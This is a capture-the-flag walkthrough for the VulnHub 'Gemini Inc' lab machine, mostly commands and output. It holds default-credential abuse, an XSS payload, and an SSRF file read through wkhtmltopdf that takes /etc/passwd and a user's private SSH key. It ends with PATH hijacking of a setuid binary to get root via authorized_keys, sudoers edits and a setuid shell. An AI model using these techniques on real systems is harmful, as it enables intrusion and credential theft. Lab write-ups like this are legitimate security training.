# Gemini Inc  

**https://www.vulnhub.com/entry/gemini-inc-1,227/**  

### NMAP  

kali@kali:~$ nmap 192.168.1.60 -p1-65535 -A  

>Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-22 20:52 CEST  
>Nmap scan report for geminiinc.home (192.168.1.60)  
>Host is up (0.00042s latency).  
>Not shown: 65533 closed ports  
>PORT   STATE SERVICE VERSION  
>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)  
>| ssh-hostkey:   
>|   2048 e9:e3:89:b6:3b:ea:e4:13:c8:ac:38:44:d6:ea:c0:e4 (RSA)  
>|   256 8c:19:77:fd:36:72:7e:34:46:c4:29:2d:2a:ac:15:98 (ECDSA)  
>|_  256 cc:2b:4c:ce:d7:61:73:d7:d8:7e:24:56:74:54:99:88 (EdDSA)  
>80/tcp open  http    Apache httpd 2.4.25  
>| http-ls: Volume /  
>| SIZE  TIME              FILENAME  
>| -     2018-01-07 08:35  test2/  
>|_  
>|_http-server-header: Apache/2.4.25 (Debian)  
>|_http-title: Index of /  
>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel  
>
>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
>Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds  

  
### HTTP PORT  

When we access hxxp://192.168.1.60/test2/ we get the following message:  

  
>Welcome Guest  
>
>This is an internal web application designed for employees to view their profile details and also, allow them to export their details to PDF.  
>The web application is built and modified from the following open source project:  
>**https://github.com/ionutvmi/master-login-system**  

Well, we have a source. Let's read the installation process:  

>\#\#== Installation ==  
>
>    Upload the files to your server
>          Run /install.php in your browser and complete the form. After running the **install.php** script please check that the inc/settings.php contains the correct database connection details.
>          Done !!

  
In the install.php we found:  

  
>  if(!isset($page->error)) {  
>        $page->success = "The installation was successful ! Thank you for using master loging system and we hope you enjo it ! Have fun ! <br/><br/>  
>          \<a class='btn btn-success' href='./index.php'>Start exploring</a>  
>          \<br/><br/>  
>          **\<h3>USER: admin <br/> PASSWORD: 1234</h3>";**  

   
Well, we have the default admin credentials...  

Now we see two options, edit profile or export profile. Let's focus on the first one:  

>Rank: Administrator  
>Last seen: 3 months ago  
>Email: sec.9emin1@gmail[.]com  

If we edit the display name we see that there's no banned chars, and it shows them in the html as they come. It's vulnerable to XSS:  

> <script>alert('1')</script>  

  

Not much we can do with an XSS in a boot2root machine. Let's see the second option. Export generates a pdf with the following details:  

>File name: document.pdf  
>File size: 26.7 KB (27,386 bytes)  
>Title: Profile of admin   
>**Creator: wkhtmltopdf 0.12.4**  
>PDF Producer: Qt 4.8.7  
>PDF Version: 1.4  
>Page Count: 1   

After some research we found the following entry in the issues section:  
SSRF and file read with wkhtmltoimage #3570  
**https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570**  
   
Let's try this scenario:

kali@kali:~$ cat /var/www/html/test.php  

>\<?php  
>     header('location:file:///etc/passwd');  
>\?>  

We edit the profile again with the iframe pointing at our server:  

  
> <iframe height="1000" width="1000" src="hxxp://192.168.1.115/test.php"></iframe>  

And the pdf outputs the /etc/passwd file:  
  
root\:x:0:0:root:/root:/bin/bash  
...
**gemini1\:x:1000:1000:gemini-sec,,,:/home/gemini1:/bin/bash**  
..

Here we find the home folder of the local user in the machine: gemini1. Now we need to enter without the key. Let's try the ssh id_rsa file:
  
kali@kali:~$ cat /var/www/html/test.php  
>\<?php  
>     header('location:file:///home/gemini1/.ssh/id_rsa');  
>\?>  

Now it outputs the key: 

>-----BEGIN RSA PRIVATE KEY-----  
>MIIEpQIBAAKCAQEAv8sYkCmUFupwQ8pXsm0XCAyxcR6m5y9GfRWmQmrvb9qJP3xs  
>... 
>-----END RSA PRIVATE KEY-----  

Now, we can log in the server without the user password:

kali@kali:~$ vim rsa.key  

kali@kali:~$ sudo ssh -l gemini1 192.168.1.60 -i rsa.key   
>Linux geminiinc 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64  
>...  
>Last login: Tue Jan  9 08:04:52 2018 from 192.168.0.112  
>gemini1@geminiinc:~$   
>  
>gemini1@geminiinc:~$ id  
>uid=1000(gemini1) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)  

Now let's elevate to root. We check this really good cheat sheet and try some stuff:  

**https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/**  
  
Finally, after enumerating some stuff, we find the following:  

gemini1@geminiinc:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  
>-rwsr-xr-- 1 root dip 365960 Nov 11  2016 /usr/sbin/pppd  
>-rwsr-xr-x 1 root root 23352 May 24  2017 /usr/bin/pkexec  
>-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn  
>-rwsr-xr-x 1 root root 8792 Jan  7 06:10 /usr/bin/listinfo  
>-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd  
>-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh  
>-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp  
>-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd  
>-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo  
>-rwsr-xr-x 1 root root 44304 Mar 22  2017 /bin/mount  
>-rwsr-xr-x 1 root root 31720 Mar 22  2017 /bin/umount  
>-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping  
>-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su  
>-rwsr-xr-x 1 root root 30800 Jun 23  2016 /bin/fusermount  

Let's see what listinfo does:  

gemini1@geminiinc:~$ strings /usr/bin/listinfo  
>...  
>/sbin/ifconfig | grep inet  
>/bin/netstat -tuln | grep 22  
>/bin/netstat -tuln | grep 80  
>date  
>displaying network information...      
>displaying Apache listening port...      
>displaying SSH listening port...      
>displaying current date...    

Now we have to trick the system to execute what we want:  

gemini1@geminiinc:~$ export PATH=/home/gemini1:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games  
>gemini1@geminiinc:~$ env  
>...
>PATH=/home/gemini1:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games  

This is a pretty shitty way to solve the challenge, but It counts as well. We can execute code as root...  

gemini1@geminiinc:~$ cat date  
whoami  
ls /root/  
cat /root/flag.txt  

gemini1@geminiinc:~$ chmod +x date  

gemini1@geminiinc:~$ listinfo  
...    
displaying current date...    root  
displaying current date...    flag.txt  
displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  
displaying current date...      
displaying current date...    Congratulations on solving this boot2root machine!  
displaying current date...    Cheers!  
displaying current date...             _.._..,_,_  
displaying current date...            (          )  
displaying current date...             ]~,"-.-~~[  
displaying current date...           .=])' (;  ([  
displaying current date...           | ]:: '    [  
displaying current date...           '=]): .)  ([  
displaying current date...             |:: '    |  
displaying current date...              ~~----~~  
displaying current date...    https://twitter.com/sec_9emin1  
displaying current date...    https://scriptkidd1e.wordpress.com  
displaying current date...      
displaying current date...    mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  

  
### GETTING ROOT SHELL  

Yes, it didn't feel right. So, there's a couple other ways to get a root shell.  

First one, generating a authorized_keys in the server as root:  

kali@kali:~$ ssh-keygen   
>Generating public/private rsa key pair.  
>Enter file in which to save the key (/home/kali/.ssh/id_rsa):   

kali@kali:~$ cat /home/kali/.ssh/id_rsa.pub   
>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA...+7Zvz kali@kali  

gemini1@geminiinc:~$ cat date  
>mkdir /root/.ssh/  
>echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAA...+7Zvz kali@kali' > /root/.ssh/authorized_keys  

gemini1@geminiinc:~$ listinfo  
>...  

kali@kali:~$ ssh -l root 192.168.1.60  
>Linux geminiinc 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64  
>...  
>Last login: Tue Jan  9 08:07:05 2018  
root@geminiinc:~# id  
>uid=0(root) gid=0(root) groups=0(root)  

Second one, make gemeni1 a user that can execute sudo without password:  

gemini1@geminiinc:~$ cat date  
>echo "gemini1 ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers  
gemini1@geminiinc:~$ listinfo  
>...  

gemini1@geminiinc:~$ sudo -l  
>Matching Defaults entries for gemini1 on geminiinc:  
>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
>  
>User gemini1 may run the following commands on geminiinc:  
>    (ALL) NOPASSWD: ALL  

gemini1@geminiinc:~$ sudo su  
root@geminiinc:/home/gemini1# id  
>uid=0(root) gid=0(root) groups=0(root)  

And the third one. Spawn a shell in c, with the setuid set at 0:  

**https://stackoverflow.com/questions/556194/calling-a-script-from-a-setuid-root-c-program-script-does-not-run-as-root**  

gemini1@geminiinc:~$ cat test.c   
>#include <stdio.h>  
>#include <stdlib.h>  
>#include <sys/types.h>  
>#include <unistd.h>  
>
>int main()  
>{  
>       setuid(0);  
>       system("/bin/bash - ");  
>       return 0;  
>}  

gemini1@geminiinc:~$ gcc test.c -o date  
  
gemini1@geminiinc:~$ listinfo  
>...  
root@geminiinc:~# id  
>displaying current date...    uid=0(root) gid=1000(gemini1) groups=1000(gemini1),24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)  
